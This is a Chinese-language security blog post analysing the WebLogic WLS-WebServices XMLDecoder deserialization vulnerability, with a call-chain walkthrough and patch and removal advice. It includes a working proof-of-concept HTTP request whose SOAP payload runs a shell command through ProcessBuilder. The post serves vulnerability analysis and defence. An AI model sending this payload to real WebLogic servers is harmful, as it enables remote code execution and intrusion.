<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>WebLogic WLS-WebServices组件反序列化漏洞分析</title>
  <link rel="icon" href="/favicon.ico">
  <link rel="apple-touch-icon" href="/public/img/head.png">
  <link rel="stylesheet" href="/public/css/amazeui.min.css">
  <link rel="stylesheet" href="/public/css/app.css">
  <link rel="stylesheet" href="/public/css/highlight-js/github.css">
</head>
<body>

<div class="am-container lp-container">
  <header class="am-topbar lp-topbar">
    <h1 class="am-topbar-brand">
      <a href="/">Tomato's Blog</a>
    </h1>
    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: '#lp-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
      <ul class="am-nav am-nav-pills am-topbar-nav">
        <li><a href="/">Archives</a></li>
        <!-- <li><a href="#">Categories</a></li> -->
        <li><a href="/friends.html">Friends</a></li>
        <!-- <li><a href="#">About Me</a></li> -->
        <li><a href="/feed.xml">Feed</a></li>
      </ul>
    </div>
  </header>
</div>


<div class="am-container lp-container">
  <div class="lp-post">
    <div class="lp-post-header">
      <h1 class="lp-post-title">WebLogic WLS-WebServices组件反序列化漏洞分析</h1>
      <div class="lp-post-meta">
        <i class="am-icon-calculator"></i><span class="lp-post-date">2017-12-22</span>
        <i class="am-icon-tags"></i><span class="lp-post-tags">vulnerability analysis</span>
      </div>
    </div>
    <div class="lp-post-content">
    <p>最近由于数字货币的疯涨，大量机器被入侵后用来挖矿，其中存在不少部署了Weblogic服务的机器，因为Weblogic最近所爆出安全漏洞的exploit在地下广泛流传。回到这个漏洞本身，其原因在于WLS-WebServices这个组件中，因为它使用了XMLDecoder来解析XML数据。有安全研究人员在去年八月份就向官方报告了此漏洞，Oracle官方在今年四月份提供了补丁程序。但是，四月份提供的补丁感觉是在敷衍了事，因此很快就被绕过了。为此官方又只能新发补丁，不过十月份所提供的补丁，检查还是比较严格。下面具体来看看此次反序列漏洞</p>
<h2 id="0x01漏洞复现">0x01漏洞复现</h2>
<p>测试环境 Weblogic 10.3.6.0/jdk1.6.0_45/Linux</p>

<p>漏洞POC</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
Host: 127.0.0.1:7001
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close
Content-Type: text/xml
Content-Length: 777

&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;  
  &lt;soapenv:Header&gt; 
    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;  
      &lt;java&gt; 
        &lt;void class="java.lang.ProcessBuilder"&gt; 
          &lt;array class="java.lang.String" length="3"&gt; 
            &lt;void index="0"&gt; 
              &lt;string&gt;/bin/sh&lt;/string&gt; 
            &lt;/void&gt;  
            &lt;void index="1"&gt; 
              &lt;string&gt;-c&lt;/string&gt; 
            &lt;/void&gt;  
            &lt;void index="2"&gt; 
              &lt;string&gt;id &gt; /tmp/chaitin&lt;/string&gt;
            &lt;/void&gt; 
          &lt;/array&gt;  
          &lt;void method="start"/&gt; 
        &lt;/void&gt; 
      &lt;/java&gt; 
    &lt;/work:WorkContext&gt; 
  &lt;/soapenv:Header&gt;  
  &lt;soapenv:Body/&gt; 
&lt;/soapenv:Envelope&gt;
</code></pre></div></div>
<p><img src="/old_img/2017-12-23-15139326533815.jpg" alt="" />
<img src="/old_img/2017-12-23-15139326768139.jpg" alt="" /></p>
<h2 id="0x02漏洞分析">0x02漏洞分析</h2>
<p>此次漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP请求。然后在</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube
</code></pre></div></div>
<p>类中获取XML数据传递给XMLDecoder来解析。</p>

<p>解析XML的调用链为</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest

weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld

weblogic.wsee.workarea.WorkContextXmlInputAdapter

</code></pre></div></div>
<p>首先看到weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法
<img src="/old_img/2017-12-23-15139338809033.jpg" alt="" />
获取到localHeader1后传递给readHeaderOld方法，其内容为<code class="highlighter-rouge">&lt;work:WorkContext&gt;</code>所包裹的数据，然后继续跟进weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld方法
<img src="/old_img/2017-12-23-15139340157538.jpg" alt="" />
在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，最后通过XMLDecoder来进行反序列化操作。
<img src="/old_img/2017-12-23-15139341082935.jpg" alt="" />
关于XMLDecoder的反序化问题13年就已经被人发现，近期再次被利用到Weblogic中由此可见JAVA生态圈中的安全问题是多么糟糕。值得一提的是此次漏洞出现了两处CVE编号，因为在Oracle官方在修复CVE-2017-3506所提供的patch只是简单的检查了XML中是否包含了<object>节点，然后将<object>换为<void>即可绕过此补丁。因此在修复过程中用户一定要使用Oracle官方十月份所提供的patch。</void></object></object></p>

<h2 id="0x03漏洞防御">0x03漏洞防御</h2>
<ol>
  <li>临时解决方案
根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为：</li>
</ol>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat

Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war

Middleware/wlserver_10.3/server/lib/wls-wsat.war
</code></pre></div></div>
<p>以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-wsat/ 是否为404页面。</p>

<ol>
  <li>官方补丁修复
前往Oracle官网下载10月份所提供的安全补丁。</li>
</ol>

<h2 id="0x04-参考资料">0x04 参考资料</h2>
<p>http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html</p>

<p>https://github.com/pwntester/XMLDecoder</p>


    </div>
    
    <div id="disqus_thread"></div>
<script type="text/javascript">
var disqus_shortname = "tomatos-blog";

/* * * DON'T EDIT BELOW THIS LINE * * */
(function() {
var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
  </div>
</div>

<div class="am-container lp-container">
  <footer class="am-footer lp-footer">
    <p>Copyright © 2014-2017 All Rights Reserved</p>
    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
  </afooter>
</div>


<div data-am-widget="gotop" class="am-gotop am-gotop-fixed">
  <a href="#top" title="回到顶部">
    <span class="am-gotop-title">GoTop</span>
    <i class="am-gotop-icon am-icon-chevron-up"></i>
  </a>
</div>

<script src="/public/js/jquery.min.js"></script>
<script src="/public/js/amazeui.min.js"></script>
<script>
$(document).ready(function(){
  $.AMUI.progress.start();
});
$(window).load(function(){
  $.AMUI.progress.done();
});
</script>
<script src="/public/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<!-- 网站统计代码 -->
<div hidden>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1256394309'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1256394309%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</div>
<div hidden>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?b8f48a0cd4b04ec22678a4cd23fcb9dd";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
</div>
</body>
</html>
